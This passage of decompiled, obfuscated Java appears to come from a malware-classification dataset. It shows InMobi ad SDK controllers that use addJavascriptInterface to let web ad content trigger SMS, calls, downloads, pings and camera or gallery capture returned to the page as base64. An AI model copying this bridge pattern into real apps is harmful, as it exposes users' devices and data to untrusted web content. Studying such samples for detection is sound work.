this.imWebView.getDensity());         resizeProperties.offsetX=(int)(resizeProperties.offsetX * this.imWebView.getDensity());         resizeProperties.offsetY=(int)(resizeProperties.offsetY * this.imWebView.getDensity());         Log.debug(Constants.RENDERING_LOG_TAG,""JSDisplayController-> At the time of resize the properties are: Resize width: "" + resizeProperties.width + "" Resize height: ""+ resizeProperties.height+ "" Resize offsetX: ""+ resizeProperties.offsetX+ "" Resize offsetY: ""+ resizeProperties.offsetY+ "" customClosePosition: ""+ resizeProperties.customClosePosition+ "" allowOffscreen: ""+ resizeProperties.allowOffscreen);         this.imWebView.resize(resizeProperties);       }     }  catch (    Exception e) {       Log.debug(Constants.RENDERING_LOG_TAG,""Exception while expanding the ad. "",e);     }   }   @JavascriptInterface public void onOrientationChange(){     this.imWebView.onOrientationEventChange();   }   private void a(  JSController.ExpandProperties expandProperties,  JSController.ExpandProperties expandProperties2){     expandProperties.width=expandProperties2.width;     expandProperties.height=expandProperties2.height;     expandProperties.x=expandProperties2.x;     expandProperties.y=expandProperties2.y;     expandProperties.actualWidthRequested=expandProperties2.actualWidthRequested;     expandProperties.actualHeightRequested=expandProperties2.actualHeightRequested;     expandProperties.lockOrientation=expandProperties2.lockOrientation;     expandProperties.isModal=expandProperties2.isModal;     expandProperties.useCustomClose=expandProperties2.useCustomClose;     expandProperties.orientation=expandProperties2.orientation;     expandProperties.topStuff=expandProperties2.topStuff;     expandProperties.bottomStuff=expandProperties2.bottomStuff;     expandProperties.portraitWidthRequested=expandProperties2.portraitWidthRequested;     expandProperties.portraitHeightRequested=expandProperties2.portraitHeightRequested;     expandProperties.zeroWidthHeight=expandProperties2.zeroWidthHeight;     expandProperties.rotationAtExpand=expandProperties2.rotationAtExpand;     expandProperties.currentX=expandProperties2.currentX;     expandProperties.currentY=expandProperties2.currentY;   }   private void a(  JSController.ResizeProperties resizeProperties,  JSController.ResizeProperties resizeProperties2){     resizeProperties.width=resizeProperties2.width;     resizeProperties.height=resizeProperties2.height;     resizeProperties.allowOffscreen=resizeProperties2.allowOffscreen;     resizeProperties.customClosePosition=resizeProperties2.customClosePosition;     resizeProperties.offsetX=resizeProperties2.offsetX;     resizeProperties.offsetY=resizeProperties2.offsetY;   }   @JavascriptInterface public void useCustomClose(  boolean z){     ApiStatCollector.getLogger().logEvent(new EventLog(new ApiStatCollector.ApiEventType(10),null));     Log.debug(Constants.RENDERING_LOG_TAG,""JSDisplayController-> useCustomClose"" + z);     this.imWebView.setCustomClose(z);   }   @JavascriptInterface public void close(){     ApiStatCollector.getLogger().logEvent(new EventLog(new ApiStatCollector.ApiEventType(13),null));     Log.debug(Constants.RENDERING_LOG_TAG,""JSDisplayController-> close"");     if (this.imWebView.mOriginalWebviewForExpandUrl != null) {       this.imWebView.mOriginalWebviewForExpandUrl.close();     }     this.imWebView.close();   }   @JavascriptInterface public boolean isViewable(){     ApiStatCollector.getLogger().logEvent(new EventLog(new ApiStatCollector.ApiEventType(14),null));     Log.debug(Constants.RENDERING_LOG_TAG,""JSDisplayController-> isViewable"");     return this.imWebView.isViewable();   }   @JavascriptInterface public String getPlacementType(){     ApiStatCollector.getLogger().logEvent(new EventLog(new ApiStatCollector.ApiEventType(15),null));     Log.debug(Constants.RENDERING_LOG_TAG,""JSDisplayController-> getPlacementType"");     return this.imWebView.getPlacementType();   }   @JavascriptInterface public String getOrientation(){     ApiStatCollector.getLogger().logEvent(new EventLog(new ApiStatCollector.ApiEventType(16),null));     try {       String currentRotation=this.imWebView.getCurrentRotation(this.imWebView.getIntegerCurrentRotation());       Log.debug(Constants.RENDERING_LOG_TAG,""JSDisplayController-> getOrientation: "" + currentRotation);       return currentRotation;     }  catch (    Exception e) {       Log.debug(Constants.RENDERING_LOG_TAG,""Error getOrientation: -1"",e);       return ""-1"";     }   }   @Override public void stopAllListeners(){   }   public void reset(){     if (this.expProps != null) {       this.expProps.reinitializeExpandProperties();     }     if (this.d != null) {       this.d.initializeResizeProperties();     }   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.inmobi.re.controller\JSUtilityController.code","public class JSUtilityController extends JSController {   DownloadManager a;   Object b;   private JSDisplayController c;   private Map<String,Boolean> d;   private AudioTriggerCallback e;   private boolean f;   private boolean g;   public JSUtilityController(  IMWebView iMWebView,  Context context){     super(iMWebView,context);     this.a=null;     this.d=new HashMap();     this.e=new com.inmobi.re.controller.d(this);     this.f=false;     this.g=false;     this.c=new JSDisplayController(iMWebView,context);     iMWebView.addJavascriptInterface(this.c,""displayController"");   }   public void registerBroadcastListener(){     b();     if (this.b == null && Build.VERSION.SDK_INT > 8) {       try {         if (this.a == null) {           this.a=(DownloadManager)this.imWebView.getActivity().getSystemService(AdTrackerConstants.GOAL_DOWNLOAD);         }         this.b=new f();         this.imWebView.getActivity().registerReceiver((BroadcastReceiver)this.b,new IntentFilter(""android.intent.action.DOWNLOAD_COMPLETE""));       }  catch (      Exception e2) {         Log.internal(Constants.RENDERING_LOG_TAG,""JSUtilityController-> registerBroadcastListener. Unable to register download listener"",e2);       }     }   } public class f extends BroadcastReceiver {     f(){     }     @Override public void onReceive(    Context context,    Intent intent){       if (""android.intent.action.DOWNLOAD_COMPLETE"".equals(intent.getAction())) {         long longExtra=intent.getLongExtra(""extra_download_id"",0L);         DownloadManager.Query query=new DownloadManager.Query();         query.setFilterById(longExtra);         Cursor query2=JSUtilityController.this.a.query(query);         if (query2.moveToFirst()) {           int columnIndex=query2.getColumnIndex(""status"");           if (16 == query2.getInt(columnIndex)) {             JSUtilityController.this.imWebView.raiseError(""download failed"",""storePicture"");           }  else {             if (8 == query2.getInt(columnIndex)) {             }           }         }       }     }   }   public void unRegisterBroadcastListener(){     try {       c();       if (Build.VERSION.SDK_INT > 8) {         this.imWebView.getActivity().unregisterReceiver((BroadcastReceiver)this.b);         this.b=null;       }     }  catch (    Exception e2) {       Log.internal(Constants.RENDERING_LOG_TAG,""JSUtilityController-> unregisterBroadcastListener. Unable to unregister download listener"",e2);     }   }   @JavascriptInterface public void sendSMS(  String str,  String str2){     ApiStatCollector.getLogger().logEvent(new EventLog(new ApiStatCollector.ApiEventType(27),null));     Log.debug(Constants.RENDERING_LOG_TAG,""JSUtilityController-> sendSMS: recipient: "" + str + "" body: ""+ str2);     try {       Intent intent=new Intent(""android.intent.action.VIEW"");       intent.putExtra(""address"",str);       intent.putExtra(""sms_body"",str2);       intent.setType(""vnd.android-dir/mms-sms"");       intent.addFlags(268435456);       this.imWebView.getActivity().startActivity(intent);       this.imWebView.fireOnLeaveApplication();     }  catch (    Exception e2) {       Log.debug(Constants.RENDERING_LOG_TAG,""Exception in sending SMS "",e2);       this.imWebView.raiseError(""Exception in sending SMS"",""sendSMS"");     }   }   @JavascriptInterface public void sendMail(  String str,  String str2,  String str3){     ApiStatCollector.getLogger().logEvent(new EventLog(new ApiStatCollector.ApiEventType(28),null));     Log.debug(Constants.RENDERING_LOG_TAG,""JSUtilityController-> sendMail: recipient: "" + str + "" subject: ""+ str2+ "" body: ""+ str3);     try {       Intent intent=new Intent(""android.intent.action.SEND"");       intent.setType(""plain/text"");       intent.putExtra(""android.intent.extra.EMAIL"",new String[]{str});       intent.putExtra(""android.intent.extra.SUBJECT"",str2);       intent.putExtra(""android.intent.extra.TEXT"",str3);       intent.addFlags(268435456);       this.imWebView.getActivity().startActivity(Intent.createChooser(intent,""Choose the Email Client.""));       this.imWebView.fireOnLeaveApplication();     }  catch (    Exception e2) {       Log.debug(Constants.RENDERING_LOG_TAG,""Exception in sending mail "",e2);       this.imWebView.raiseError(""Exception in sending mail"",""sendMail"");     }   }   private String a(  String str){     if (TextUtils.isEmpty(str)) {       return null;     }     if (!str.startsWith(""tel:"")) {       return ""tel:"" + str;     }     return str;   }   @JavascriptInterface public void makeCall(  String str){     ApiStatCollector.getLogger().logEvent(new EventLog(new ApiStatCollector.ApiEventType(29),null));     Log.debug(Constants.RENDERING_LOG_TAG,""JSUtilityController-> makeCall: number: "" + str);     try {       String a2=a(str);       if (a2 == null) {         this.imWebView.raiseError(""Bad Phone Number"",""makeCall"");       }  else {         Intent intent=new Intent(""android.intent.action.VIEW"",Uri.parse(a2.toString()));         intent.addFlags(268435456);         this.imWebView.getActivity().startActivity(intent);         this.imWebView.fireOnLeaveApplication();       }     }  catch (    Exception e2) {       Log.debug(Constants.RENDERING_LOG_TAG,""Exception in making call "",e2);       this.imWebView.raiseError(""Exception in making call"",""makeCall"");     }   }   @JavascriptInterface public void createCalendarEvent(  String str,  String str2,  String str3,  String str4){     ApiStatCollector.getLogger().logEvent(new EventLog(new ApiStatCollector.ApiEventType(30),null));     Log.debug(Constants.RENDERING_LOG_TAG,""JSUtilityController-> createEvent: date: "" + str + "" location: ""+ str3+ "" body: ""+ str4);     if (!c(""calendar"")) {       Log.internal(Constants.RENDERING_LOG_TAG,""createCalendarEvent called even if it is not supported"");       return;     }     try {       GregorianCalendar convertDateString=convertDateString(str);       GregorianCalendar convertDateString2=convertDateString(str2);       Intent intent=new Intent(this.imWebView.getActivity(),(Class<?>)IMBrowserActivity.class);       intent.putExtra(AnalyticsEvent.EVENT_ID,IMBrowserActivity.generateId(new e()));       intent.putExtra(""action"",""createCalendarEvent"");       intent.putExtra(""description"",str4);       intent.putExtra(""location"",str3);       intent.putExtra(""start"",convertDateString.getTimeInMillis());       intent.putExtra(""end"",convertDateString2.getTimeInMillis());       this.imWebView.getActivity().startActivity(intent);       if (this.imWebView.mListener != null) {         this.imWebView.mListener.onLeaveApplication();       }     }  catch (    Exception e2) {       Log.debug(Constants.RENDERING_LOG_TAG,""exception"" + e2.getMessage());       this.imWebView.raiseError(""Date format is incorrect"",""createCalendarEvent"");     }   } class e implements StartActivityForResultCallback {     e(){     }     @Override public void onActivityResult(    int i,    Intent intent){     }   }   public GregorianCalendar convertDateString(  String str) throws ParseException {     Date parse=new SimpleDateFormat(""yyyy-MM-dd'T'hh:mmZ"",Locale.ENGLISH).parse(str);     GregorianCalendar gregorianCalendar=new GregorianCalendar();     gregorianCalendar.setTime(parse);     return gregorianCalendar;   }   @Override public void stopAllListeners(){     try {       this.c.stopAllListeners();     }  catch (    Exception e2) {     }   }   @JavascriptInterface public void showAlert(  String str){     Log.debug(Constants.RENDERING_LOG_TAG,str);   }   @JavascriptInterface public void log(  String str){     Log.debug(Constants.RENDERING_LOG_TAG,""Ad Log Message: "" + str);   }   @JavascriptInterface public void asyncPing(  String str){     ApiStatCollector.getLogger().logEvent(new EventLog(new ApiStatCollector.ApiEventType(31),null));     try {       Log.debug(Constants.RENDERING_LOG_TAG,""JSUtilityController-> asyncPing: url: "" + str);       if (!URLUtil.isValidUrl(str)) {         this.imWebView.raiseError(""Invalid url"",""asyncPing"");       }  else {         b(str);       }     }  catch (    Exception e2) {     }   } public class d extends Thread {     final String a;     d(    String str){       this.a=str;     }     @Override public void run(){       HttpURLConnection httpURLConnection;       HttpURLConnection httpURLConnection2=null;       try {         try {           String replaceAll=this.a.replaceAll(""%25"",""%"");           Log.debug(Constants.RENDERING_LOG_TAG,""Pinging URL: "" + replaceAll);           httpURLConnection=(HttpURLConnection)new URL(replaceAll).openConnection();         }  catch (        Exception e) {           e=e;         }       }  catch (      Throwable th) {         th=th;       }       try {         httpURLConnection.setConnectTimeout(20000);         httpURLConnection.setRequestMethod(""GET"");         InternalSDKUtil.addCommonPropertiesToConnection(httpURLConnection);         Log.debug(Constants.RENDERING_LOG_TAG,""Async Ping Connection Response Code: "" + httpURLConnection.getResponseCode());         if (httpURLConnection != null) {           httpURLConnection.disconnect();         }       }  catch (      Exception e2) {         httpURLConnection2=httpURLConnection;         e=e2;         Log.debug(Constants.RENDERING_LOG_TAG,""Error doing async Ping. "",e);         if (httpURLConnection2 != null) {           httpURLConnection2.disconnect();         }       } catch (      Throwable th2) {         httpURLConnection2=httpURLConnection;         th=th2;         if (httpURLConnection2 != null) {           httpURLConnection2.disconnect();         }         throw th;       }     }   }   private void b(  String str){     new d(str).start();   }   @JavascriptInterface public void playAudio(  String str,  boolean z,  boolean z2,  boolean z3,  String str2,  String str3,  String str4){     ApiStatCollector.getLogger().logEvent(new EventLog(new ApiStatCollector.ApiEventType(32),null));     Log.debug(Constants.RENDERING_LOG_TAG,""playAudio: url: "" + str + "" autoPlay: ""+ z+ "" controls: ""+ z2+ "" loop: ""+ z3+ "" startStyle: ""+ str2+ "" stopStyle: ""+ str3+ "" id:""+ str4);     this.imWebView.playAudio(str,z,z2,z3,str2,str3,str4);   }   @JavascriptInterface public void muteAudio(  String str){     ApiStatCollector.getLogger().logEvent(new EventLog(new ApiStatCollector.ApiEventType(33),null));     Log.debug(Constants.RENDERING_LOG_TAG,""JSUtilityController-> muteAudio: "");     this.imWebView.muteAudio(str);   }   @JavascriptInterface public void unMuteAudio(  String str){     ApiStatCollector.getLogger().logEvent(new EventLog(new ApiStatCollector.ApiEventType(34),null));     Log.debug(Constants.RENDERING_LOG_TAG,""JSUtilityController-> unMuteAudio: "");     this.imWebView.unMuteAudio(str);   }   @JavascriptInterface public boolean isAudioMuted(  String str){     ApiStatCollector.getLogger().logEvent(new EventLog(new ApiStatCollector.ApiEventType(35),null));     Log.debug(Constants.RENDERING_LOG_TAG,""JSUtilityController-> isAudioMuted: "");     return this.imWebView.isAudioMuted(str);   }   @JavascriptInterface public void setAudioVolume(  String str,  int i){     ApiStatCollector.getLogger().logEvent(new EventLog(new ApiStatCollector.ApiEventType(36),null));     Log.debug(Constants.RENDERING_LOG_TAG,""JSUtilityController-> setAudioVolume: "" + str + "" ""+ i);     this.imWebView.setAudioVolume(str,i);   }   @JavascriptInterface public int getAudioVolume(  String str){     ApiStatCollector.getLogger().logEvent(new EventLog(new ApiStatCollector.ApiEventType(37),null));     Log.debug(Constants.RENDERING_LOG_TAG,""JSUtilityController-> getAudioVolume: "");     return this.imWebView.getAudioVolume(str);   }   @JavascriptInterface public void seekAudio(  String str,  int i){     ApiStatCollector.getLogger().logEvent(new EventLog(new ApiStatCollector.ApiEventType(38),null));     Log.debug(Constants.RENDERING_LOG_TAG,""JSUtilityController-> seekAudio: "");     this.imWebView.seekAudio(str,i);   }   @JavascriptInterface public double getMicIntensity(){     ApiStatCollector.getLogger().logEvent(new EventLog(new ApiStatCollector.ApiEventType(51),null));     return this.imWebView.getLastGoodKnownMicValue();   }   @JavascriptInterface public void playVideo(  String str,  boolean z,  boolean z2,  boolean z3,  boolean z4,  String str2,  String str3,  String str4,  String str5,  String str6,  String str7,  String str8){     ApiStatCollector.getLogger().logEvent(new EventLog(new ApiStatCollector.ApiEventType(40),null));     Log.debug(Constants.RENDERING_LOG_TAG,""JSUtilityController-> playVideo: url: "" + str + "" audioMuted: ""+ z+ "" autoPlay: ""+ z2+ "" controls: ""+ z3+ "" loop: ""+ z4+ "" x: ""+ str2+ "" y: ""+ str3+ "" width: ""+ str4+ "" height: ""+ str5+ "" startStyle: ""+ str6+ "" stopStyle: ""+ str7+ "" id:""+ str8);     JSController.Dimensions dimensions=new JSController.Dimensions();     dimensions.x=a(str2,-99999);     dimensions.y=a(str3,-99999);     dimensions.width=a(str4,-99999);     dimensions.height=a(str5,-99999);     if (dimensions.width == -99999 && dimensions.height == -99999) {       int[] a2=a();       dimensions.x=0;       dimensions.y=0;       dimensions.width=a2[0];       dimensions.height=a2[1];     }     this.imWebView.playVideo(str,z,z2,z3,z4,dimensions,str6,str7,str8);   }   private int a(  String str,  int i){     try {       return Integer.parseInt(str);     }  catch (    NumberFormatException e2) {       return i;     }   }   @JavascriptInterface public void pauseAudio(  String str){     ApiStatCollector.getLogger().logEvent(new EventLog(new ApiStatCollector.ApiEventType(39),null));     Log.debug(Constants.RENDERING_LOG_TAG,""JSUtilityController-> pauseAudio: id :"" + str);     this.imWebView.pauseAudio(str);   }   @JavascriptInterface public void pauseVideo(  String str){     ApiStatCollector.getLogger().logEvent(new EventLog(new ApiStatCollector.ApiEventType(47),null));     Log.debug(Constants.RENDERING_LOG_TAG,""JSUtilityController-> pauseVideo: id :"" + str);     this.imWebView.pauseVideo(str);   }   @JavascriptInterface public void closeVideo(  String str){     ApiStatCollector.getLogger().logEvent(new EventLog(new ApiStatCollector.ApiEventType(50),null));     Log.debug(Constants.RENDERING_LOG_TAG,""JSUtilityController-> closeVideo: id :"" + str);     this.imWebView.closeVideo(str);   }   @JavascriptInterface public void hideVideo(  String str){     ApiStatCollector.getLogger().logEvent(new EventLog(new ApiStatCollector.ApiEventType(48),null));     Log.debug(Constants.RENDERING_LOG_TAG,""JSUtilityController-> hideVideo: id :"" + str);     this.imWebView.hideVideo(str);   }   @JavascriptInterface public void showVideo(  String str){     ApiStatCollector.getLogger().logEvent(new EventLog(new ApiStatCollector.ApiEventType(49),null));     Log.debug(Constants.RENDERING_LOG_TAG,""JSUtilityController-> showVideo: id :"" + str);     this.imWebView.showVideo(str);   }   @JavascriptInterface public void muteVideo(  String str){     ApiStatCollector.getLogger().logEvent(new EventLog(new ApiStatCollector.ApiEventType(41),null));     Log.debug(Constants.RENDERING_LOG_TAG,""JSUtilityController-> muteVideo: "");     this.imWebView.muteVideo(str);   }   @JavascriptInterface public void unMuteVideo(  String str){     ApiStatCollector.getLogger().logEvent(new EventLog(new ApiStatCollector.ApiEventType(42),null));     Log.debug(Constants.RENDERING_LOG_TAG,""JSUtilityController-> unMuteVideo: "");     this.imWebView.unMuteVideo(str);   }   @JavascriptInterface public void seekVideo(  String str,  int i){     ApiStatCollector.getLogger().logEvent(new EventLog(new ApiStatCollector.ApiEventType(46),null));     Log.debug(Constants.RENDERING_LOG_TAG,""JSUtilityController-> seekVideo: "");     this.imWebView.seekVideo(str,i);   }   @JavascriptInterface public boolean isVideoMuted(  String str){     ApiStatCollector.getLogger().logEvent(new EventLog(new ApiStatCollector.ApiEventType(43),null));     Log.debug(Constants.RENDERING_LOG_TAG,""JSUtilityController-> isVideoMuted: "");     return this.imWebView.isVideoMuted(str);   }   @JavascriptInterface public void setVideoVolume(  String str,  int i){     ApiStatCollector.getLogger().logEvent(new EventLog(new ApiStatCollector.ApiEventType(44),null));     Log.debug(Constants.RENDERING_LOG_TAG,""JSUtilityController-> setVideoVolume: "");     this.imWebView.setVideoVolume(str,i);   }   @JavascriptInterface public int getVideoVolume(  String str){     ApiStatCollector.getLogger().logEvent(new EventLog(new ApiStatCollector.ApiEventType(45),null));     Log.debug(Constants.RENDERING_LOG_TAG,""JSUtilityController-> getVideoVolume: "");     return this.imWebView.getVideoVolume(str);   }   @JavascriptInterface public void openExternal(  String str){     ApiStatCollector.getLogger().logEvent(new EventLog(new ApiStatCollector.ApiEventType(2),null));     Log.debug(Constants.RENDERING_LOG_TAG,""JSUtilityController-> openExternal: url: "" + str);     this.imWebView.openExternal(str);   }   @JavascriptInterface public String getScreenSize(){     ApiStatCollector.getLogger().logEvent(new EventLog(new ApiStatCollector.ApiEventType(17),null));     Log.debug(Constants.RENDERING_LOG_TAG,""JSUtilityController-> getScreenSize"");     DisplayMetrics displayMetrics=new DisplayMetrics();     ((WindowManager)this.mContext.getSystemService(""window"")).getDefaultDisplay().getMetrics(displayMetrics);     int i=(int)(displayMetrics.widthPixels / displayMetrics.density);     int i2=(int)(displayMetrics.heightPixels / displayMetrics.density);     JSONObject jSONObject=new JSONObject();     try {       jSONObject.put(""width"",i);       jSONObject.put(""height"",i2);     }  catch (    JSONException e2) {       Log.debug(Constants.RENDERING_LOG_TAG,""Failed to get screen size"");     }     return jSONObject.toString();   }   @JavascriptInterface public String getCurrentPosition(){     ApiStatCollector.getLogger().logEvent(new EventLog(new ApiStatCollector.ApiEventType(18),null));     Log.debug(Constants.RENDERING_LOG_TAG,""JSUtilityController-> getCurrentPosition""); synchronized (this.imWebView.mutexcPos) {       this.imWebView.sendToCPHandler();       while (this.imWebView.acqMutexcPos.get()) {         try {           this.imWebView.mutexcPos.wait();         }  catch (        InterruptedException e2) {           Log.debug(Constants.RENDERING_LOG_TAG,""mutexcPos failed "",e2);         }       }       this.imWebView.acqMutexcPos.set(true);     }     return this.imWebView.curPosition.toString();   }   @JavascriptInterface public String getDefaultPosition(){     ApiStatCollector.getLogger().logEvent(new EventLog(new ApiStatCollector.ApiEventType(19),null));     Log.debug(Constants.RENDERING_LOG_TAG,""JSUtilityController-> getDefaultPosition""); synchronized (this.imWebView.mutexdPos) {       this.imWebView.sendToDPHandler();       while (this.imWebView.acqMutexdPos.get()) {         try {           this.imWebView.mutexdPos.wait();         }  catch (        InterruptedException e2) {           Log.debug(Constants.RENDERING_LOG_TAG,""mutexdPos failed "",e2);         }       }       this.imWebView.acqMutexdPos.set(true);     }     Log.debug(Constants.RENDERING_LOG_TAG,""mutexdPassed"" + this.imWebView.defPosition);     return this.imWebView.defPosition.toString();   }   private int[] a(){     int[] iArr=new int[2];     try {       FrameLayout frameLayout=(FrameLayout)((ViewGroup)this.imWebView.getOriginalParent()).getRootView().findViewById(R.id.content);       iArr[0]=(int)(frameLayout.getWidth() / this.imWebView.getDensity());       iArr[1]=(int)(frameLayout.getHeight() / this.imWebView.getDensity());     }  catch (    Exception e2) {       iArr[1]=0;       iArr[0]=0;     }     return iArr;   }   @JavascriptInterface public String getMaxSize(){     ApiStatCollector.getLogger().logEvent(new EventLog(new ApiStatCollector.ApiEventType(20),null));     int[] a2=a();     JSONObject jSONObject=new JSONObject();     try {       jSONObject.put(""width"",a2[0]);       jSONObject.put(""height"",a2[1]);     }  catch (    JSONException e2) {     }     return jSONObject.toString();   }   @JavascriptInterface public void postToSocial(  int i,  String str,  String str2,  String str3){     ApiStatCollector.getLogger().logEvent(new EventLog(new ApiStatCollector.ApiEventType(21),null));     if (!c(""postToSocial."" + i)) {       this.imWebView.raiseError(""Social type "" + i + "" is not supported."",""postToSocial"");       return;     }     String str4=str == null ? """" : str;     if (str2 == null) {       str4="""";     }     if (str3 == null) {       str3="""";     }     Intent intent=new Intent(this.imWebView.getActivity(),(Class<?>)IMBrowserActivity.class);     intent.putExtra(AnalyticsEvent.EVENT_ID,IMBrowserActivity.generateId(new c()));     intent.putExtra(""action"",""postToSocial"");     intent.putExtra(""socialType"",i);     intent.putExtra(""text"",str4);     intent.putExtra(""link"",str2);     intent.putExtra(AdView.BANNER_TYPE_IMAGE,str3);     this.imWebView.getActivity().startActivity(intent);     if (this.imWebView.mListener != null) {       this.imWebView.mListener.onLeaveApplication();     }   } class c implements StartActivityForResultCallback {     c(){     }     @Override public void onActivityResult(    int i,    Intent intent){     }   }   private boolean c(  String str){     Boolean bool;     Boolean bool2;     Boolean bool3;     Boolean bool4;     Boolean bool5;     Boolean bool6;     ApiStatCollector.getLogger().logEvent(new EventLog(new ApiStatCollector.ApiEventType(22),null));     Boolean bool7=this.d.get(str);     if (bool7 != null) {       return bool7.booleanValue();     }     PackageManager packageManager=this.imWebView.getActivity().getPackageManager();     if (str.equals(""tel"")) {       Boolean valueOf=Boolean.valueOf(packageManager.checkPermission(""android.permission.CALL_PHONE"",packageManager.getNameForUid(Binder.getCallingUid())) == 0);       this.d.put(str,valueOf);       return valueOf.booleanValue();     }     if (str.equals(""sms"")) {       Intent intent=new Intent(""android.intent.action.VIEW"");       intent.setType(""vnd.android-dir/mms-sms"");       if (this.imWebView.getActivity().getPackageManager().resolveActivity(intent,65536) == null) {         bool6=false;       }  else {         bool6=true;       }       this.d.put(str,bool6);       return bool6.booleanValue();     }     if (str.equals(""calendar"")) {       Intent intent2=new Intent(""android.intent.action.VIEW"");       intent2.setType(""vnd.android.cursor.item/event"");       if (this.imWebView.getActivity().getPackageManager().resolveActivity(intent2,65536) == null) {         bool5=false;       }  else {         bool5=true;       }       this.d.put(str,bool5);       return bool5.booleanValue();     }     if (str.equals(""microphone"")) {       Boolean valueOf2=Boolean.valueOf(packageManager.checkPermission(""android.permission.RECORD_AUDIO"",packageManager.getNameForUid(Binder.getCallingUid())) == 0);       this.d.put(str,valueOf2);       return valueOf2.booleanValue();     }     if (str.equals(""storePicture"")) {       Boolean valueOf3=Boolean.valueOf(Build.VERSION.SDK_INT > 8 && packageManager.checkPermission(""android.permission.WRITE_EXTERNAL_STORAGE"",packageManager.getNameForUid(Binder.getCallingUid())) == 0);       this.d.put(str,valueOf3);       return valueOf3.booleanValue();     }     if (str.equals(""postToSocial.2"") || str.equals(""postToSocial.3"") || str.equals(""inlineVideo"")) {       Boolean bool8=true;       this.d.put(str,bool8);       return bool8.booleanValue();     }     if (str.equals(""takeCameraPicture"")) {       if (this.imWebView.getActivity().getPackageManager().resolveActivity(new Intent(""android.media.action.IMAGE_CAPTURE""),65536) == null) {         bool4=false;       }  else {         bool4=true;       }       this.d.put(str,bool4);       return bool4.booleanValue();     }     if (str.equals(""getGalleryImage"")) {       if (this.imWebView.getActivity().getPackageManager().resolveActivity(new Intent(""android.intent.action.PICK"",MediaStore.Images.Media.EXTERNAL_CONTENT_URI),65536) == null) {         bool3=false;       }  else {         bool3=true;       }       this.d.put(str,bool3);       return bool3.booleanValue();     }     if (str.equals(""vibrate"")) {       Boolean valueOf4=Boolean.valueOf(packageManager.checkPermission(""android.permission.VIBRATE"",packageManager.getNameForUid(Binder.getCallingUid())) == 0);       Vibrator vibrator=(Vibrator)this.c.imWebView.getActivity().getSystemService(""vibrator"");       if (vibrator == null) {         bool2=false;       }  else       if (Build.VERSION.SDK_INT >= 11) {         bool2=Boolean.valueOf(valueOf4.booleanValue() && vibrator.hasVibrator());       }  else {         bool2=valueOf4;       }       this.d.put(str,bool2);       return bool2.booleanValue();     }     if (!str.equals(""html5video"")) {       return false;     }     if (Build.VERSION.SDK_INT >= 11) {       bool=Boolean.valueOf(this.imWebView.isHardwareAccelerated() && this.imWebView.isEnabledHardwareAcceleration());     }  else {       bool=true;     }     this.d.put(str,bool);     return bool.booleanValue();   }   @JavascriptInterface public String supportsFeature(  String str){     return String.valueOf(c(str));   }   @JavascriptInterface public void storePicture(  String str){     ApiStatCollector.getLogger().logEvent(new EventLog(new ApiStatCollector.ApiEventType(23),null));     Log.debug(Constants.RENDERING_LOG_TAG,""Store picture called on URL: "" + str);     try {       Uri parse=Uri.parse(InternalSDKUtil.getFinalRedirectedUrl(str));       if (c(""storePicture"")) {         try {           DownloadManager.Request request=new DownloadManager.Request(parse);           request.setDestinationInExternalPublicDir(Environment.DIRECTORY_DOWNLOADS,parse.getLastPathSegment());           this.a.enqueue(request);         }  catch (        Exception e2) {           this.imWebView.raiseError(""Unable to store."",""storePicture"");         }       }     }  catch (    Exception e3) {       this.imWebView.raiseError(""Invalid URL."",""storePicture"");     }   }   @JavascriptInterface public String takeCameraPicture(){     ApiStatCollector.getLogger().logEvent(new EventLog(new ApiStatCollector.ApiEventType(24),null));     if (!c(""takeCameraPicture"")) {       Log.internal(Constants.RENDERING_LOG_TAG,""takeCameraPicture called even if it is not supported"");     }  else {       Intent intent=new Intent(this.imWebView.getActivity(),(Class<?>)IMBrowserActivity.class);       Uri insert=this.mContext.getContentResolver().insert(MediaStore.Images.Media.EXTERNAL_CONTENT_URI,new ContentValues());       intent.putExtra(AnalyticsEvent.EVENT_ID,IMBrowserActivity.generateId(new b(insert)));       intent.putExtra(""URI"",insert);       intent.putExtra(""action"",""takeCameraPicture"");       this.imWebView.getActivity().startActivity(intent);       if (this.imWebView.mListener != null) {         this.imWebView.mListener.onLeaveApplication();       }     }     return null;   } class b implements StartActivityForResultCallback {     final Uri a;     b(    Uri uri){       this.a=uri;     }     @Override public void onActivityResult(    int i,    Intent intent){       String convertMediaUriToPath;       if (i == -1) {         if (intent == null) {           convertMediaUriToPath=ImageProcessing.convertMediaUriToPath(this.a,JSUtilityController.this.mContext);         }  else {           convertMediaUriToPath=ImageProcessing.convertMediaUriToPath(intent.getData(),JSUtilityController.this.mContext);         }         Bitmap compressedBitmap=ImageProcessing.getCompressedBitmap(convertMediaUriToPath,JSUtilityController.this.mContext);         int width=compressedBitmap.getWidth();         int height=compressedBitmap.getHeight();         JSUtilityController.this.imWebView.raiseCameraPictureCapturedEvent(ImageProcessing.getBase64EncodedImage(compressedBitmap,JSUtilityController.this.mContext),width,height);         return;       }       JSUtilityController.this.imWebView.raiseError(""User did not take a picture"",""takeCameraPicture"");     }   }   @JavascriptInterface public String getGalleryImage(){     ApiStatCollector.getLogger().logEvent(new EventLog(new ApiStatCollector.ApiEventType(25),null));     if (!c(""getGalleryImage"")) {       Log.internal(Constants.RENDERING_LOG_TAG,""getGalleryImage called even if it is not supported"");     }  else {       Intent intent=new Intent(this.imWebView.getActivity(),(Class<?>)IMBrowserActivity.class);       intent.putExtra(AnalyticsEvent.EVENT_ID,IMBrowserActivity.generateId(new a()));       intent.putExtra(""action"",""getGalleryImage"");       this.imWebView.getActivity().startActivity(intent);       if (this.imWebView.mListener != null) {         this.imWebView.mListener.onLeaveApplication();       }     }     return null;   } class a implements StartActivityForResultCallback {     a(){     }     @Override public void onActivityResult(    int i,    Intent intent){       if (i == -1) {         Bitmap compressedBitmap=ImageProcessing.getCompressedBitmap(ImageProcessing.convertMediaUriToPath(intent.getData(),JSUtilityController.this.mContext),JSUtilityController.this.mContext);         int width=compressedBitmap.getWidth();         int height=compressedBitmap.getHeight();         JSUtilityController.this.imWebView.raiseGalleryImageSelectedEvent(ImageProcessing.getBase64EncodedImage(compressedBitmap,JSUtilityController.this.mContext),width,height);         return;       }       JSUtilityController.this.imWebView.raiseError(""User did not select a picture"",""getGalleryImage"");     }   }   @JavascriptInterface public void vibrate(){     ApiStatCollector.getLogger().logEvent(new EventLog(new ApiStatCollector.ApiEventType(26),null));     if (!this.imWebView.isViewable()) {       this.imWebView.raiseError(""Creative not visible. Will not vibrate."",""vibrate"");     }  else     if (c(""vibrate"")) {       